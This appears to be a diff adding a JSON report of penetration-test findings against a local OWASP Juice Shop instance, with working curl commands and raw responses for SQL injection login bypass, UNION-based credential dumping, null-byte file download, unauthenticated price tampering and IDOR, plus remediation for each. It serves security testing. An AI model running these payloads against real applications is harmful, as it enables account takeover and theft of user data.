@@ -1,0 +1,1693 @@
+[
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "SQL Injection Authentication Bypass - Admin Login",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cve": "CWE-89",
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The login endpoint at /rest/user/login is vulnerable to SQL injection in the email parameter. By injecting `' OR 1=1--` in the email field, the application authenticates as the first user in the database (admin@juice-sh.op) with role 'admin', bypassing all authentication controls. A valid JWT token with admin privileges is returned.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}'"
+      ],
+      "payloads": [],
+      "raw_request": "POST /rest/user/login HTTP/1.1\\nHost: 127.0.0.1:3000\\nContent-Type: application/json\\n\\n{\"email\":\"' OR 1=1--\",\"password\":\"a\"}",
+      "raw_response": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWV9fQ...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Response: {\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}\\nDecoded JWT payload: {\"status\":\"success\",\"data\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"role\":\"admin\",\"password\":\"0192023a7bbd73250516f069df18b500\"}}"
+      ],
+      "explanation": "The /rest/user/login endpoint passes the email parameter directly into a SQL query without parameterization. By sending `' OR 1=1--` as the email, the WHERE clause is modified to always be true, returning the first user record (admin). The server returns a valid JWT token with admin role privileges. This grants full administrative access to the application including admin panel, user management, and sensitive configuration data. The password hash for admin (0192023a7bbd73250516f069df18b500) is also leaked in the JWT payload."
+    },
+    "remediation": "Use parameterized queries (prepared statements) for all SQL operations. Never concatenate user input into SQL strings. Implement an ORM with proper input binding.",
+    "plugin_or_component": "Express /rest/user/login route",
+    "endpoint": "POST /rest/user/login",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:14:11Z",
+    "id": "vuln_242ad0",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "UNION-based SQL Injection - Product Search (Full Database Exfiltration)",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cve": "CWE-89",
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The product search endpoint /rest/products/search is vulnerable to UNION-based SQL injection. By injecting UNION SELECT statements through the q parameter, an attacker can extract the complete database schema (sqlite_master), all user emails and password hashes from the Users table, security answers, card numbers, and any other data from the SQLite database. 23 user credential pairs (email:password_hash) were extracted.",
+    "evidence": {
+      "commands": [
+        "curl -s \"http://127.0.0.1:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type='table'--\"\\ncurl -s \"http://127.0.0.1:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20email||':'||password,2,3,4,5,6,7,8,9%20FROM%20Users--\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/products/search?q=qwert'))%20UNION%20SELECT%20email||':'||password,2,3,4,5,6,7,8,9%20FROM%20Users-- HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "{\"status\":\"success\",\"data\":[{\"id\":\"admin@juice-sh.op:0192023a7bbd73250516f069df18b500\",\"name\":\"2\",\"description\":\"3\",\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9},...23 total records]}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Schema extraction: 21 tables found including Users, Baskets, Cards, SecurityAnswers, Wallets, Feedbacks\\nCredential dump: 23 email:hash pairs extracted\\nSample: admin@juice-sh.op:0192023a7bbd73250516f069df18b500"
+      ],
+      "explanation": "The product search endpoint constructs a SQL query by directly interpolating the q parameter without sanitization. By crafting a payload `qwert')) UNION SELECT email||':'||password,2,3,4,5,6,7,8,9 FROM Users--`, the attacker can extract all credentials from the Users table. The 9-column UNION SELECT matches the Products table structure. The complete database schema was also extracted from sqlite_master, revealing all 21 tables and their column definitions. This is a complete database compromise allowing extraction of all application data including PII, financial data, and authentication credentials."
+    },
+    "remediation": "Use parameterized queries for search functionality. Implement input validation and sanitization for the search parameter. Apply the principle of least privilege to database accounts.",
+    "plugin_or_component": "Express /rest/products/search route",
+    "endpoint": "GET /rest/products/search?q=",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:14:26Z",
+    "id": "vuln_67ac83",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Confidential Document Exposure - FTP Directory Listing",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "sensitive_data_exposure",
+    "mitre_attack_id": "T1083",
+    "mitre_attack_name": "File and Directory Discovery",
+    "iso27001_control": "A.8.2.3",
+    "status": "exploited",
+    "description": "The /ftp/ directory is publicly accessible and lists multiple sensitive files including acquisitions.md (marked confidential, contains acquisition plans), coupons_2013.md.bak (backup coupon data), package.json.bak and package-lock.json.bak (application dependencies with potential version info), incident-support.kdbx (KeePass password database), encrypt.pyc (Python encryption code), and suspicious_errors.yml. Despite robots.txt disallowing /ftp, the files are directly accessible.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/ftp/\\ncurl -s http://127.0.0.1:3000/ftp/acquisitions.md"
+      ],
+      "payloads": [],
+      "raw_request": "GET /ftp/ HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "HTML directory listing showing: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml, quarantine/",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "FTP directory listing: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml, quarantine/\\nacquisitions.md content: '# Planned Acquisitions > This document is confidential! Do not distribute!'"
+      ],
+      "explanation": "The FTP directory at /ftp/ is publicly accessible without authentication and contains multiple sensitive files. The acquisitions.md file is explicitly marked as confidential and contains planned company acquisitions that could have stock market impact. Backup files (.bak) expose application internals. The incident-support.kdbx file is a KeePass database potentially containing passwords. This represents a significant data exposure that could be leveraged for further attacks or insider trading."
+    },
+    "remediation": "Remove the /ftp/ directory from public access. Implement proper access controls. Remove sensitive files from the web server. Move backup files to secure storage.",
+    "plugin_or_component": "Express static file serving",
+    "endpoint": "GET /ftp/",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:14:40Z",
+    "id": "vuln_a04852",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Null Byte Injection - FTP File Extension Bypass",
+    "severity": "high",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cve": null,
+    "category": "path_traversal",
+    "mitre_attack_id": "T1083",
+    "mitre_attack_name": "File and Directory Discovery",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The FTP file server at /ftp/ restricts downloads to .md and .pdf files. However, appending a URL-encoded null byte (%2500) followed by .md to any filename bypasses the extension validation. This allows downloading any file from the FTP directory regardless of its actual extension, including .bak backup files, .gg files, .yml configuration files, and .kdbx password databases.",
+    "evidence": {
+      "commands": [
+        "curl -s \"http://127.0.0.1:3000/ftp/coupons_2013.md.bak%2500.md\"\\ncurl -s \"http://127.0.0.1:3000/ftp/package.json.bak%2500.md\"\\ncurl -s \"http://127.0.0.1:3000/ftp/eastere.gg%2500.md\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /ftp/coupons_2013.md.bak%2500.md HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "n&lt;MibgC7sn\\nmNYS#gC7sn\\no*IVigC7sn\\nk#pDlgC7sn\\no*I]pgC7sn\\nn(XRvgC7sn\\nn(XLtgC7sn\\nk#*AfgC7sn\\nq:&lt;IqgC7sn\\npEw8ogC7sn\\npes[BgC7sn\\nl}6D$gC7ss",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "coupons_2013.md.bak: 12 encoded coupon codes downloaded successfully\\npackage.json.bak: Full application dependency list (juice-shop v6.2.0-SNAPSHOT)\\neastere.gg: Easter egg with base64 encoded path to hidden content"
+      ],
+      "explanation": "The file server validation at /juice-shop/build/routes/fileServer.js:59 checks the file extension but is vulnerable to null byte injection. When %2500 is used (double-URL-encoded null byte), the validation sees '.md' as the extension, but the underlying filesystem truncates at the null byte and serves the actual file. This bypasses all file type restrictions and allows downloading sensitive backup files including coupon codes, application configuration, and encrypted data."
+    },
+    "remediation": "Fix the file extension validation to properly handle null bytes. Implement a whitelist approach for allowed files rather than extension-based filtering. Strip null bytes from request paths before processing.",
+    "plugin_or_component": "routes/fileServer.js",
+    "endpoint": "GET /ftp/{filename}%2500.md",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:15:36Z",
+    "id": "vuln_9fcef9",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "SQL Injection - Security Answers Extraction via UNION SELECT",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cve": null,
+    "category": "sql_injection",
+    "mitre_attack_id": "T1190",
+    "mitre_attack_name": "Exploit Public-Facing Application",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "Using the UNION-based SQL injection in /rest/products/search, all security question answers for every user were extracted from the SecurityAnswers table. These answers (though hashed) are linked by UserId and SecurityQuestionId, enabling password reset attacks. Combined with the user credentials dump, this constitutes a complete compromise of all user account recovery mechanisms.",
+    "evidence": {
+      "commands": [
+        "curl -s \"http://127.0.0.1:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20UserId||':'||SecurityQuestionId||':'||answer,2,3,4,5,6,7,8,9%20FROM%20SecurityAnswers--\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/products/search?q=qwert'))%20UNION%20SELECT%20UserId||':'||SecurityQuestionId||':'||answer,2,3,4,5,6,7,8,9%20FROM%20SecurityAnswers-- HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "{\"status\":\"success\",\"data\":[{\"id\":\"1:2:db8b1e81c9a3e9ed03ae162f3197209977bc68c5b095c6ed4d163baa653f48a0\",...}]}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "21 security answer records extracted. Sample: UserId=1 (admin), QuestionId=2, Answer hash=db8b1e81c9a3e9ed03ae162f3197209977bc68c5b095c6ed4d163baa653f48a0"
+      ],
+      "explanation": "The security answers for all 21 users were extracted via SQL injection. Each record contains the UserId, SecurityQuestionId, and hashed answer. Combined with the extracted user credentials and known security questions, this enables complete account takeover through the password reset flow. The security answers appear to be SHA-256 hashed but can be cracked for known common answers."
+    },
+    "remediation": "Use parameterized queries. Implement proper input validation. Hash security answers with unique salts per user.",
+    "plugin_or_component": "Express /rest/products/search route",
+    "endpoint": "GET /rest/products/search?q=",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:15:50Z",
+    "id": "vuln_8e6a0d",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Exposed Prometheus Metrics Endpoint",
+    "severity": "low",
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1082",
+    "mitre_attack_name": "System Information Discovery",
+    "iso27001_control": "A.12.6.1",
+    "status": "confirmed",
+    "description": "The /metrics endpoint exposes Prometheus metrics without authentication, revealing internal application metrics including HTTP request counts by status code, file upload errors, LLM token usage, startup duration, and custom juiceshop-prefixed metrics. This information can be used by attackers to understand application behavior and identify attack patterns.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/metrics"
+      ],
+      "payloads": [],
+      "raw_request": "GET /metrics HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "http_requests_count{status_code=\"2XX\",app=\"juiceshop\"} 37\\nhttp_requests_count{status_code=\"5XX\",app=\"juiceshop\"} 3\\njuiceshop_llm_input_tokens_total{app=\"juiceshop\"} 0",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "http_requests_count{status_code=\"2XX\",app=\"juiceshop\"} 37\\nhttp_requests_count{status_code=\"5XX\",app=\"juiceshop\"} 3\\njuiceshop_llm_input_tokens_total{app=\"juiceshop\"} 0"
+      ],
+      "explanation": "The Prometheus metrics endpoint at /metrics is publicly accessible without any authentication. It exposes internal operational metrics including HTTP request counts grouped by status code, file upload error counters, LLM token usage metrics, and application startup duration. While individual metrics may not be directly exploitable, the aggregate information helps an attacker fingerprint the application state, identify error patterns, and time attacks."
+    },
+    "remediation": "Restrict access to /metrics endpoint with authentication or limit it to internal network access only.",
+    "plugin_or_component": "Prometheus metrics middleware",
+    "endpoint": "GET /metrics",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:17:09Z",
+    "id": "vuln_f9350d",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Wallet Mnemonic Phrase Exposure in Public Feedback",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "sensitive_data_exposure",
+    "mitre_attack_id": "T1552",
+    "mitre_attack_name": "Unsecured Credentials",
+    "iso27001_control": "A.8.2.3",
+    "status": "confirmed",
+    "description": "A cryptocurrency wallet mnemonic phrase is exposed in public feedback from UserId 21: 'purpose betray marriage blame crunch monitor spin slide donate sport lift clutch'. This is a 12-word BIP-39 mnemonic that could be used to reconstruct the wallet and steal any funds. The feedback is accessible without authentication at /api/Feedbacks/.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/api/Feedbacks/"
+      ],
+      "payloads": [],
+      "raw_request": "GET /api/Feedbacks/ HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "{\"id\":4,\"UserId\":21,\"comment\":\"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\"\",\"rating\":1}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Feedback ID 4 from UserId 21: \"Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\"\""
+      ],
+      "explanation": "Public feedback endpoint /api/Feedbacks/ contains a customer feedback (ID 4, UserId 21) that includes a full 12-word BIP-39 mnemonic phrase for a cryptocurrency wallet. This sensitive credential is publicly accessible without authentication and can be used to reconstruct the wallet, potentially allowing theft of any cryptocurrency funds. The feedback also reveals the wallet path '/juicy-nft', providing additional context for wallet access."
+    },
+    "remediation": "Implement content filtering on user-submitted feedback to redact sensitive data. Apply input validation to prevent posting of credential-like patterns.",
+    "plugin_or_component": "Feedback API",
+    "endpoint": "GET /api/Feedbacks/",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:17:20Z",
+    "id": "vuln_71ee05",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Exposed JWT RSA Public Key - Algorithm Confusion Attack Vector",
+    "severity": "high",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cve": null,
+    "category": "cryptographic_weakness",
+    "mitre_attack_id": "T1552.004",
+    "mitre_attack_name": "Unsecured Credentials: Private Keys",
+    "iso27001_control": "A.10.1.2",
+    "status": "confirmed",
+    "description": "The JWT RSA public key is exposed at /encryptionkeys/jwt.pub. This key can be used in an RS256-to-HS256 algorithm confusion attack where the attacker signs a JWT using the public key as an HMAC secret. If the server accepts both RS256 and HS256 algorithms, an attacker could forge arbitrary JWTs to impersonate any user. The /encryptionkeys/ directory also exposes premium.key containing the value '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42'.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/encryptionkeys/jwt.pub\\ncurl -s http://127.0.0.1:3000/encryptionkeys/premium.key"
+      ],
+      "payloads": [],
+      "raw_request": "GET /encryptionkeys/jwt.pub HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "-----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\\n-----END RSA PUBLIC KEY-----",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "jwt.pub: -----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\\n-----END RSA PUBLIC KEY-----\\npremium.key: 1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42"
+      ],
+      "explanation": "The /encryptionkeys/ directory is publicly accessible and contains two critical cryptographic files. The jwt.pub file contains the RSA public key used for JWT verification. With this key, an attacker can attempt an algorithm confusion attack (RS256 → HS256) to forge JWTs. The premium.key file contains what appears to be a premium content decryption key. Both files are served without any authentication requirement, directly exposing the application's cryptographic infrastructure."
+    },
+    "remediation": "Remove the /encryptionkeys/ directory from public access. Store cryptographic keys securely and never expose them through the web server. Validate the JWT algorithm server-side to prevent algorithm confusion attacks.",
+    "plugin_or_component": "Express static file serving - encryptionkeys directory",
+    "endpoint": "GET /encryptionkeys/jwt.pub",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:18:45Z",
+    "id": "vuln_37f740",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Business Logic Flaw - Zero Star Rating Accepted",
+    "severity": "low",
+    "cvss_score": 3.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    "cve": null,
+    "category": "business_logic",
+    "mitre_attack_id": "T1565",
+    "mitre_attack_name": "Data Manipulation",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The Feedbacks API accepts a rating of 0, bypassing the expected minimum rating of 1 star. While the Angular client-side validation enforces a minimum of 1 star, the API endpoint can be called directly with rating:0, allowing submission of zero-star ratings that should not be possible.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/api/Feedbacks/ -X POST -H \"Content-Type: application/json\" -d '{\"comment\":\"test feedback\",\"rating\":0,\"captchaId\":0,\"captcha\":\"250\"}'"
+      ],
+      "payloads": [],
+      "raw_request": "POST /api/Feedbacks/ HTTP/1.1\\nHost: 127.0.0.1:3000\\nContent-Type: application/json\\n\\n{\"comment\":\"test feedback\",\"rating\":0,\"captchaId\":0,\"captcha\":\"250\"}",
+      "raw_response": "{\"status\":\"success\",\"data\":{\"id\":9,\"comment\":\"test feedback\",\"rating\":0,\"updatedAt\":\"2026-07-28T07:18:22.735Z\",\"createdAt\":\"2026-07-28T07:18:22.735Z\",\"UserId\":null}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Response: {\"status\":\"success\",\"data\":{\"id\":9,\"comment\":\"test feedback\",\"rating\":0,\"updatedAt\":\"2026-07-28T07:18:22.735Z\",\"createdAt\":\"2026-07-28T07:18:22.735Z\",\"UserId\":null}}"
+      ],
+      "explanation": "The server-side validation for the Feedback rating does not enforce a minimum value of 1. By sending a POST request directly to /api/Feedbacks/ with rating:0, the server accepts the feedback with a zero-star rating. This is a client-side-only validation bypass where the Angular frontend enforces the constraint but the backend does not. The feedback was successfully created with id:9 and rating:0."
+    },
+    "remediation": "Implement server-side validation to enforce minimum rating of 1 star on the Feedbacks API endpoint.",
+    "plugin_or_component": "Feedbacks API",
+    "endpoint": "POST /api/Feedbacks/",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:18:56Z",
+    "id": "vuln_f99ab7",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "CAPTCHA Answer Leaked in REST API Response",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1185",
+    "mitre_attack_name": "Browser Session Hijacking",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The CAPTCHA REST API at /rest/captcha/ returns both the captcha challenge and its answer in the same response. This completely defeats the purpose of the CAPTCHA, as an attacker can programmatically read the answer and submit forms automatically. The response includes captchaId, captcha (the math expression), and answer (the solution).",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/rest/captcha/"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/captcha/ HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "{\"captchaId\":0,\"captcha\":\"10*5*5\",\"answer\":\"250\"}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "{\"captchaId\":0,\"captcha\":\"10*5*5\",\"answer\":\"250\"}"
+      ],
+      "explanation": "The CAPTCHA API endpoint returns the complete captcha challenge along with its answer in the same JSON response. When calling GET /rest/captcha/, the response includes captchaId, the captcha expression (e.g., '10*5*5'), and the answer (e.g., '250'). This means any automated tool can fetch the captcha, read the answer from the response, and submit it, completely bypassing the CAPTCHA protection. This was used to successfully submit a feedback with rating 0."
+    },
+    "remediation": "Never include the captcha answer in the API response. Store the answer server-side only, keyed by captchaId, and validate it on submission without exposing it.",
+    "plugin_or_component": "CAPTCHA REST API",
+    "endpoint": "GET /rest/captcha/",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:19:06Z",
+    "id": "vuln_abfdd8",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Product Tampering - Unauthenticated Price/Description Modification",
+    "severity": "critical",
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
+    "cve": null,
+    "category": "broken_access_control",
+    "mitre_attack_id": "T1565.001",
+    "mitre_attack_name": "Data Manipulation: Stored Data Manipulation",
+    "iso27001_control": "A.9.4.1",
+    "status": "exploited",
+    "description": "The PUT /api/Products/{id} endpoint allows unauthenticated modification of product data, including price and description. An attacker can change any product's price to an arbitrary value (e.g., 0.01) without authentication. The product Apple Juice (1000ml) was successfully modified with price changed to 0.01. The description was sanitized (iframe tag was stripped), but the price change persisted, demonstrating a complete lack of authorization controls on product modification.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/api/Products/1 -X PUT -H \"Content-Type: application/json\" -d '{\"description\":\"<iframe src=javascript:alert(1)>\",\"price\":0.01}'"
+      ],
+      "payloads": [],
+      "raw_request": "PUT /api/Products/1 HTTP/1.1\\nHost: 127.0.0.1:3000\\nContent-Type: application/json\\n\\n{\"description\":\"<iframe src=javascript:alert(1)>\",\"price\":0.01}",
+      "raw_response": "{\"status\":\"success\",\"data\":{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"\",\"price\":0.01,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-07-28T06:56:50.794Z\",\"updatedAt\":\"2026-07-28T07:20:15.503Z\",\"deletedAt\":null}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Response: {\"status\":\"success\",\"data\":{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"\",\"price\":0.01,\"deluxePrice\":0.99,...}}\\nOriginal price was 1.99, changed to 0.01 without authentication"
+      ],
+      "explanation": "The PUT endpoint for Products accepts modifications without any authentication or authorization check. By sending a PUT request with a modified price field, the product's price was changed from its original value to 0.01. This represents a critical business logic vulnerability where an attacker can manipulate product prices before purchase, effectively purchasing items for nearly free. The description field was sanitized (HTML/iframe stripped), but all other fields including price are modifiable. This vulnerability could lead to massive financial loss if exploited at scale."
+    },
+    "remediation": "Implement proper authentication and authorization checks on all product modification endpoints. Only admin users should be able to modify product data. Validate price ranges server-side.",
+    "plugin_or_component": "Products API - PUT endpoint",
+    "endpoint": "PUT /api/Products/1",
+    "discovered_by_agent": "nodejs",
+    "discovered_at": "2026-07-28T07:20:45Z",
+    "id": "vuln_89a790",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "IDOR - Cross-User Basket Access",
+    "severity": "high",
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+    "cve": null,
+    "category": "idor",
+    "mitre_attack_id": "T1078",
+    "mitre_attack_name": "Valid Accounts",
+    "iso27001_control": "A.9.4.1",
+    "status": "exploited",
+    "description": "The /rest/basket/{id} endpoint allows authenticated users to access any user's basket by simply changing the basket ID. Using admin's JWT token (user ID 1), baskets belonging to user ID 2 (basket 2) and user ID 3 (basket 3) were successfully accessed. No ownership validation is performed — any authenticated user can view and potentially modify any other user's shopping basket, exposing product preferences and enabling basket manipulation attacks.",
+    "evidence": {
+      "commands": [
+        "curl -s http://127.0.0.1:3000/rest/basket/2 -H \"Authorization: Bearer <admin_token>\"\\ncurl -s http://127.0.0.1:3000/rest/basket/3 -H \"Authorization: Bearer <admin_token>\""
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/basket/2 HTTP/1.1\\nHost: 127.0.0.1:3000\\nAuthorization: Bearer eyJ0eXAiOiJKV1Qi...",
+      "raw_response": "{\"status\":\"success\",\"data\":{\"id\":2,\"UserId\":2,\"coupon\":null,\"createdAt\":\"...\",\"updatedAt\":\"...\",\"Products\":[]}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Basket 2: {id:2, UserId:2} - accessed by admin (UserId 1)\\nBasket 3: {id:3, UserId:3} - accessed by admin (UserId 1)"
+      ],
+      "explanation": "The basket endpoint at /rest/basket/{id} performs no ownership validation. While authentication is required (a valid JWT must be present), the server does not verify that the requesting user owns the basket being accessed. By incrementing the basket ID, an attacker with any valid account can enumerate and access all user baskets in the system. This is a classic IDOR (Insecure Direct Object Reference) vulnerability that exposes customer shopping data across all users."
+    },
+    "remediation": "Implement server-side ownership validation. Verify that the authenticated user's ID matches the basket's UserId before returning data. Use user-scoped queries instead of direct ID lookups.",
+    "plugin_or_component": "Basket REST API",
